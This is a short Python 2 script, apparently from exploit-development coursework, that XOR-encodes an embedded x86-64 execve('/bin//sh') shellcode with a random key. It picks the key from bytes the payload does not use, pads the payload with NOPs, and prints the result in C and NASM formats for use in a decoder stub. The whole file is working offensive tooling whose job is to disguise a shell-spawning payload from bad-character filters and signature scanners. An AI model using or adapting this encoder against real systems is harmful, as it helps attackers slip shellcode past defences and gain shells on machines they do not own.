#!/usr/bin/python2
import random 
import sys




#EDIT THIS LINE FOR YOUR SHELLCODE 
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" 

shellcode = '\x90' + shellcode


#generate a list of all possible bytes 

bytez = bytearray.fromhex(''.join(['%02x' % i for i in range(1,256)]))

#get a list of bytes used by the shellcode 
shellarray = bytearray(shellcode)

mod = (len(shellarray) % 8)
r = (len(shellarray) - mod + 8) - len(shellarray)
if mod > 0:
    shellcode += '\x90' *  r
keys =  set(bytez) - set(shellarray)
keys = bytearray(keys)
#select a random key 
key = random.choice(keys)
print("=" *10)
print "decryption key: " ,  hex(key)

print("=" *10)

encoded = ""
encoded2 = ""

#encrypt the shellcode with the random byte-key

for x in bytearray(shellcode) :
    y = x ^ key
    encoded += '\\x'
    encoded += '%02x' % y
    encoded2 += '0x%02x,' %y

#print to screen the encoded shellcode in two formats 
print("=" *10)
print("C version:\n\n ")
print '"' + encoded + '"' + "\n"
print("=" *10)
print("NASM version\n\n")
print encoded2 + '0x%02x' % key + "\n"
print("=" *10)
print 'Len: %d' % len(bytearray(shellcode))


